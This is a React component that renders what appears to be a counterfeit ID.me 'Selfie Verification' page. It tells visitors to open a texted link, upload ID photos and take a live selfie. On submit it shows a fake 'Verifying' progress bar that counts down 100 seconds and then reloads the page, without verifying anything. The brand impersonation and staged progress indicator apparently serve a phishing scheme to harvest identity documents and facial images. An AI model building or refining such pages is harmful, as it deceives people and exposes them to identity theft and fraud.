import React, { useEffect, useState } from "react";
import logo from '../assets/ID.me_Logo.png'
import connect from '../assets/connect.jpg'
import elogo from '../assets/logo-removebg-preview.png'


import { FaArrowDown, FaCamera, FaCircleXmark, FaDownload, FaUser } from "react-icons/fa6";
const Selfie: React.FC = () => {
 


  const [showPopup, setShowPopup] = useState(false);
  const [countdown, setCountdown] = useState(100);
  
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
  
    setShowPopup(true);
  
   
  };

  useEffect(() => {
    let timer: NodeJS.Timeout;

    if (showPopup && countdown > 0) {
      timer = setTimeout(() => {
        setCountdown((prev) => prev - 1);
      }, 1000);
    }

    if (countdown === 0) {
      window.location.reload();
    }

    return () => clearTimeout(timer);
  }, [showPopup, countdown]);



  

  return (
    <div className="flex justify-center items-center min-h-screen bg-white px-4">

{showPopup && (
  <div className="fixed inset-0 bg-black bg-opacity-80 flex justify-center items-center z-50">
    <div className="bg-white rounded-lg p-6 w-[350px] h-[400px] max-w-md text-center shadow-lg flex flex-col justify-center">
      <div className="flex justify-center mb-4"><img src={elogo} width={50}  /></div>
      <h2 className="text-sm font-semibold text-black mb-2">Verifying....</h2>
      <p className="text-sm font-semibold text-black mb-6">
        Please wait while the system connects. Avoid refreshing the page; this may take a moment.
      </p>

      <div className="w-full bg-gray-200 rounded-full h-4 mb-6">
        <div
          className="bg-green-500 h-4 rounded-full transition-all duration-1000"
          style={{ width: `${100 - countdown}%` }}
        ></div>
      </div>

      <p className="text-sm text-gray-600">Typically, <strong>{countdown}</strong> seconds remaining</p>
    </div>
  </div>
)}


      <div className="w-full max-w-md bg-white p-6 text-center relative">
        {/* Spinner */}
        <div className="absolute top-4 left-1/2 transform -translate-x-1/2">
          <svg
            className="animate-spin h-6 w-6 text-gray-600"
            xmlns="http://www.w3.org/2000/svg"
            fill="none"
            viewBox="0 0 24 24"
          >
            <circle
              className="opacity-25"
              cx="12"
              cy="12"
              r="10"
              stroke="currentColor"
              strokeWidth="4"
            />
            <path
              className="opacity-75"
              fill="currentColor"
              d="M4 12a8 8 0 018-8v8H4z"
            />
          </svg>
        </div>

        {/* Logo */}
        <h1 className="text-3xl flex  justify-center gap-4 font-medium mt-10 mb-6">
         <img src={logo} alt="" className="w-[100px]"/>
          {/* <span className="text-green-700 ml-2">CONNECT</span> */}
          
 <img src={connect} alt="" />
        </h1>

        {/* Message */}
        <p className="text-green-700 text-[16px] font-bold mb-6">
        Selfie Verification Instruction
          <br />
          
        </p>

        <p className="mb-3">Follow each step below to complete your selfie verification process. </p>
        {/* <em><p className="text-sm  mb-8">Click proceed when you are done</p> */}


<div className="flex items-center justify-center gap-5 bg-green-50 border border-green-400 rounded p-4 max-w-md mx-auto">
  <div className="text-green-200">
    <FaCircleXmark className="text-4xl text-green-500" /> {/* Bigger icon */}
  </div>
  <div>
    <h1 className="text-xl font-semibold mb-1">Step 1: Receive the Link</h1>
    <p className="text-sm w-[200px]">Check your text for the secure verification link</p>
  </div>
</div>

<div className="flex items-center justify-center mt-5 text-green-500">
  <FaArrowDown />
</div>

<div className=" mt-5 flex items-center justify-center gap-5 bg-green-50 border border-green-400 rounded p-4 max-w-md mx-auto">
  <div className="text-green-200">
    <FaDownload className="text-4xl text-green-500" /> {/* Bigger icon */}
  </div>
  <div>
    <h1 className="text-xl font-semibold mb-1">Step 2: Click the Link</h1>
    <p className="text-sm w-[200px]">Tap the link to launch the verification process</p>
  </div>
</div>
<div className="flex items-center justify-center mt-5 text-green-500">
  <FaArrowDown />
</div>

<div className=" mt-5 flex items-center justify-center gap-5 bg-green-50 border border-green-400 rounded p-4 max-w-md mx-auto">
  <div className="text-green-200">
    <FaCamera className="text-4xl text-green-500" /> {/* Bigger icon */}
  </div>
  <div>
    <h1 className="text-xl font-semibold mb-1">Step 3: Upload Your IDs</h1>
    <p className="text-sm w-[200px]">Follow the on-screen prompts to securely upload your ID photos.</p>
  </div>
</div>
<div className="flex items-center justify-center mt-5 text-green-500">
  <FaArrowDown />
</div>

<div className=" mt-5 flex items-center justify-center gap-5 bg-green-50 border border-green-400 rounded p-4 max-w-md mx-auto mb-5">
  <div className="text-green-200">
    <FaUser className="text-4xl text-green-500" /> {/* Bigger icon */}
  </div>
  <div>
    <h1 className="text-xl font-semibold mb-1">Step 4: Capture a Selfie</h1>
    <p className="text-sm w-[200px] ">Use your device's camera to take a live selfie for facial verification.</p>
  </div>
</div>


<p className="bg-green-100 text-green-800 text-sm font-semibold mb-8 p-4 text-center rounded-full">Follow the subsequent security challenge prompt and click proceed after completing it </p>

        <button onClick={handleSubmit}></button>

        
      </div>
    </div>
  );
};

export default Selfie;
